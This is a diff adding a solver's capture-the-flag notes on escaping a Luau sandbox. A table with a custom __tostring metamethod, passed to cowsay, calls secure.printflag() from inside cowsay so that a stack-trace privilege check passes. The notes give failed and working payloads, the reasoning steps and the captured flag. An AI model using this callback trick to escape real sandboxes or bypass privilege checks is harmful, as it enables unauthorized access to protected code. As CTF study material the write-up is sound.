@@ -1,0 +1,76 @@
+Wrong (everything is stripped or out of scope):
+    cowsay(setmetatable({}, { __tostring = function() package.loaded.secure.printflag() return "moo" end }))
+
+    cowsay(setmetatable({}, {   __tostring = function()   for k, v in pairs(package.loaded) do   print("LOADED:", k) end return "moo" end}))
+
+    cowsay(setmetatable({}, { __tostring = function() for k, v in pairs(debug.getregistry()) do print(k, v) end return "moo" end }))
+
+Works: cowsay has access to main thread's print function
+    cowsay(setmetatable({}, {__tostring = function() print("If you see this, you're in the main thread") return "moo" end }))
+
+    
+Successful: make cowsay indirectly call a function we control
+    cowsay(setmetatable({}, { __tostring = function() cowsay.print(setmetatable({}, { __tostring = function() secure.printflag() return "moo" end })) return "moo" end }))
+        
+cowsay(setmetatable({}, {
+  __tostring = function()
+    -- Call cowsay.print() with a string that, when formatted,
+    -- causes a call back into your code (within cowsay.lua source)
+    cowsay.format(setmetatable({}, {
+      __tostring = function()
+        -- This runs inside cowsay.format(), which *is* @cowsay
+        secure.printflag()
+        return "moo"
+      end
+    }))
+    return "moo"
+  end
+}))
+
+
+Lua: scripting lang used in Roblox
+
+Debug, package.loaded, all stripped, allowed to call secure.printflag(), or out of scope (only registed in main thread)
+We're in a sandboxed/jail thread (safeThread), but cowsay was moved to/exposed in main thread
+Came from sandbox thread, but was moved to main
+Use to escape sandbox jail and access main thread/previlaged resources
+
+
+Steps: 
+Trigger __tostring via cowsay.print()
+     print() calls .format() which calls tostring() on the object/text passed to it
+
+Call tostring() on your fake table object (which has a custom __tostring method)
+    This will trigger the __tostring method we defined in our setmetatable call (our custom function)
+
+Run your secure.printflag() call inside cowsay.lua
+    Our function calls cowsay.format() again, this time with a string that will trigger the secure.printflag() call (by overwriting __tostring again).
+
+Satisfy the secureDecorator's stack check
+  Every function is module is protected: cowsay must be in stack strace to call .printflag()
+    This works because cowsay.format() is defined inside @cowsay, so the stack trace includes @cowsay and passes the secureDecorator check.
+
+Print the flag:
+
+.;,;.{luau_is_used_in_roblox_btw._cowsays_moo}
+ _____
+< moo >
+ -----
+
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+
+ _____
+< moo >
+ -----
+
+        \   ^__^
+         \  (oo)\_______
+            (__)\       )\/\
+                ||----w |
+                ||     ||
+
+
